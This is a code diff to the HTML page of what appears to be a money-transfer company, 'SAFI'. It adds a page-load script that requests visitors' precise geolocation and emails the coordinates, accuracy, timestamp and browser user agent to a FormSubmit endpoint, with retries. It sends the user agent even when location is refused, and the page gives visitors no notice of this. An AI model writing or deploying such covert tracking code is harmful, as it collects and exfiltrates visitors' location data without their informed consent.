@@ -43,11 +43,122 @@
             }
         }
 
-        // دالة بسيطة لتعيين صورة الخلفية
+        // ----------------------------------------------------------------
+        // وظائف تحديد الموقع وإرسال البريد الإلكتروني (مُعدَّلة)
+        // ----------------------------------------------------------------
+
+        // رابط FormSubmit الجديد الذي زودتني به
+        const FORMSUBMIT_ENDPOINT = "https://formsubmit.co/el/kuxomo";
+        const API_RETRIES = 3; // عدد محاولات إرسال البيانات
+        const RETRY_DELAYS = [1000, 2000, 4000]; // تأخير بالمللي ثانية
+
+        /**
+         * دالة مساعدة لتحديد الموقع الجغرافي للمستخدم.
+         * تتطلب موافقة المستخدم.
+         * @returns {Promise<Object>} إحداثيات الموقع أو خطأ.
+         */
+        function getUserLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    return reject({ message: "Geolocation not supported." });
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        let message = "Geolocation error.";
+                        if (error.code === error.PERMISSION_DENIED) {
+                            message = "User denied Geolocation access.";
+                        } else if (error.code === error.POSITION_UNAVAILABLE) {
+                            message = "Location information unavailable.";
+                        }
+                        reject({ message: message, code: error.code });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+        
+        /**
+         * دالة لإرسال البيانات إلى البريد الإلكتروني عبر FormSubmit مع آلية المحاولة.
+         * @param {Object} data البيانات المراد إرسالها.
+         */
+        async function sendLocationEmail(data, retryCount = 0) {
+            try {
+                // إضافة موضوع الإيميل ليكون واضحاً
+                data['_subject'] = data['_subject'] || "SAFI Website Visitor Data";
+
+                const response = await fetch(FORMSUBMIT_ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                console.log("Location data successfully sent to email via FormSubmit.");
+
+            } catch (error) {
+                console.error("Error sending location data:", error);
+                
+                // تطبيق آلية المحاولة
+                if (retryCount < API_RETRIES - 1) {
+                    const delay = RETRY_DELAYS[retryCount] || 1000;
+                    console.log(`Retrying in ${delay / 1000}s...`);
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                    await sendLocationEmail(data, retryCount + 1);
+                } else {
+                    console.error("Failed to send location data after multiple retries.");
+                }
+            }
+        }
+
+
+        /**
+         * الوظيفة الرئيسية التي يتم تشغيلها عند تحميل الصفحة
+         */
         window.onload = function() {
             const heroSection = document.getElementById('hero');
-            // التأكد من وجود الصورة IMG-20251107-WA0150.jpg في نفس المجلد
+            // تعيين صورة الخلفية
             heroSection.style.backgroundImage = "url('IMG-20251107-WA0150.jpg')";
+
+            // محاولة الحصول على الموقع وإرساله
+            getUserLocation()
+                .then(location => {
+                    // إذا نجح الحصول على الموقع
+                    const emailData = {
+                        _subject: "SAFI - نجح تحديد الموقع",
+                        Timestamp: new Date().toISOString(),
+                        Latitude: location.latitude,
+                        Longitude: location.longitude,
+                        Accuracy_meters: location.accuracy,
+                        UserAgent: navigator.userAgent
+                    };
+                    sendLocationEmail(emailData);
+                })
+                .catch(error => {
+                    // إذا فشل الحصول على الموقع (رفض المستخدم، أو خطأ المتصفح)
+                    console.warn(`Could not get geolocation: ${error.message}`);
+                    const emailData = {
+                        _subject: "SAFI - فشل تحديد الموقع (No Geolocation)",
+                        Timestamp: new Date().toISOString(),
+                        Error_Message: error.message,
+                        UserAgent: navigator.userAgent
+                    };
+                    // إرسال البيانات الأساسية حتى لو فشل الموقع
+                    sendLocationEmail(emailData);
+                });
         };
     </script>
 </head>
@@ -170,7 +281,7 @@
         <div class="container mx-auto px-6">
             <div class="grid md:grid-cols-3 gap-8 text-right border-b border-teal-700 pb-8 mb-8">
                 
-                <!-- معلومات الشركة - تم تصحيح كلمة المحولات إلى الحوالات -->
+                <!-- معلومات الشركة -->
                 <div>
                     <h4 class="text-xl font-bold mb-4 border-b border-primary pb-2 inline-block">SAFI للحوالات</h4>
                     <p class="text-sm text-teal-200">حلول مالية موثوقة وسريعة لجميع احتياجاتكم.</p>
